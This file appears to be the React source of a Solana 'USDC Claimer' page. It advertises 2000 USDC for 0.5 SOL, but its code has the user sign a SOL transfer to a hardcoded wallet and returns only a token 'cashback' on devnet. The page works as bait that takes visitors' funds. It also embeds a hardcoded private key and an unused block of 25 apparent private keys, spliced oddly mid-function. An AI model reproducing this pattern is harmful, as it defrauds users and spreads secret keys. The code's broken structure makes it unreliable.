/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5aWULSS9JDU7iD8zLDFgCacy7nvXXaXJXx8GApUrnHWo3p19FgCnDF5Qt91XGG1KrB7KUu6XxZB3aQVDcp6xXxjm"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "22R6snMikyZGNYSsqqDAqxHpKpWrwK8Rt7b1iHW6xpAJxRzARvM7ZSKKtnian8QNinbkVwPbDowbcL3gFjwabV4J",
  "key1": "4iSkGCczv2Esfn986XjjBWggjWQUPaUTwmCvrW3KysVMw7V4rkZGEXSgEq5aEcekUoUf2XaJ8UX48MrgDTGiGh7b",
  "key2": "5NyrLPV3jZ4nhsmjm74QsLPCLtjrQojxNEnanTtz6573jZFpc1AjjffR9Y3Yfk3PU8CaJBZo5UreiZs8ZzTF63d4",
  "key3": "5ed9v4meqHkNx8B2XriCu58uDGpWwQhdWwiPXGeSfnKCfgHDp36PZ31ZdrrYbKWGSw1dKyNHLqJ1bp8UgDsDX3HY",
  "key4": "2kpco2cePGJdEYDHipjMdnmdXpV39SsJF4LngMZpAY9qT8ZKE3jiAdGAYUUNfKmwVG1tN2uRYUtUS3bVAtRtSSad",
  "key5": "45JKPSENLMCpSsjGqo32RZNbJD2xLrfdkfPRLZYAt3FqTkzDh24XV8vEb52xFAnFBxwpEtR6twSDgh3noGukmi3x",
  "key6": "3Y69ATZH5N1aYwAZG9woCFfneoocQidyvYR29dXhQTUZmH4GUxwHab44ARY8vbPaLnoybHghvHUQj1JPTMpY4MNY",
  "key7": "43SL1Zoc6eJViPFhPSPbHoNsA66h87XQKen1xmAvke2FEV88b8ea42NiQRtbXWv4FCDhe75ZymHXSipPvn4Ziud3",
  "key8": "3iR5cQ9VpDmf32NvprSadVvkRt4HqS9Pet4LUJgKsWSA6bxeddTjL93TE1SDC1kMZoEHnkSbrNmYpQz674DVcUoK",
  "key9": "UPb8nwFi5vE4t4mkAKugjm7JNZZejtLQ8NotJQ6BfkvKXrQsTg6KCc4mME4tFuva1jVRLzordBwTFYm6wE9rUzY",
  "key10": "5UdcJQvf4vA5EgtWFSdyCN1umLphUeyP2NEPfGyNtZ1ikZEyvoN65rALLQNAqz8fqwtTC8jsWL1Ckcx6ZfhuLS8A",
  "key11": "oLQbGR1EoszM4mM2x8N5oex6gscD31msHLFeF4Usa25Un1nY7Kyzg15rZXKFTugrwyzKj5hsDYcCSFFeFC1Q8vD",
  "key12": "3VRxhFD7bxRLzaqLfksJJ84ZiwsF8TGoBpY7jZm3dHaAX8H7EvQrFo5irneRV69Y3wccT2M6YvH4zY3vRSPc1zky",
  "key13": "jSmtMvGDyqaedv3PyzdYvD5ZomD7gQiFy9TmgiGqTyahrW6wPDWTStVdY19yVZa61ijgFBU6Pum8cR1Ccgt2y17",
  "key14": "4Fa9DFqpUEwhLtC6kJEwt7Z8dFS81Z5TzRFr9bnwBRN65K7QYHvtbLgPukpKyVkzVZEZsEXPfbZQU5mA4zupwdpn",
  "key15": "WCZrEVLZ7jpDsKcc4ufgeTViJmQ2jsohLdVq88jHeVUBJYs6ot22VG8r3F7oNsaUvhtYsYndiSbPcr3ayMY9G2J",
  "key16": "4HM2PFCbfkYnguAzQ1Mjh4kk2bbtTtjnWPGrC5ny572Pj18oz5sAQMM7Lvi3cDePXTk1PFZW1z9jd3MEHKvNuip3",
  "key17": "4DKRnqeBM4yQXEiQEXEJqeCs127qrJ1dV61Qg418gPqb831WWjvDPhtCGcJqrwYgGKXGhGMC8Mr3vFGjq2s4Rdo6",
  "key18": "EzkJHePp4zTqYRRtenbRxWh9Pn274kHJ2RC4Qt6DpfuSfECBLH6QTzbCPskQQqgvS1BAbZqyEgMhdjtsrea7AXE",
  "key19": "5Gf4n8Y5h9kbKy8RJB9skZ9M3jHKTmNztirHLwckqt88kJ3FsJ7vWtZfeRt2reZXiPLSTK87AHeHULNbt1dxGivg",
  "key20": "41nt79hwq7szpALgunxFbbDZnHnqgPonXjZnHGQWt3ve7hyf1DsWhPpu4R5w3WcESvzHo8JBKztbUvYfATsAnX9g",
  "key21": "5BfL7xBT6EDcMob3hEMhw7oM9fHQeRs577HzrRDZhM9kqJNqFSt4FDytyRPPVn7DEUiS2jJukKiXrDyGnzyjmH5p",
  "key22": "44TZ2y7d36tNcM1vfxXMpvDLMhJfAKnBeXN4Rijfnik8eNA7hL1G2JHSSkdS46hmmZM1K3wbwz7EbZgs5xx2d8vC",
  "key23": "3sMPaN5K45w5gu2QmHGz4RjGAAPawsg3X2a9QcuUo6KFfY5Q5vGJQ89SaEAfwmjoVfMaXKuqSTEJiPvbfzqp2ytH",
  "key24": "64GFpmLRueZf6T2mCMBiLFSrNTdDZC87oReEKQ6UgLXgsU5jbFa8KfiHzP2Wg4vouF9YULzwjaUhs4kywycxdYFv"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
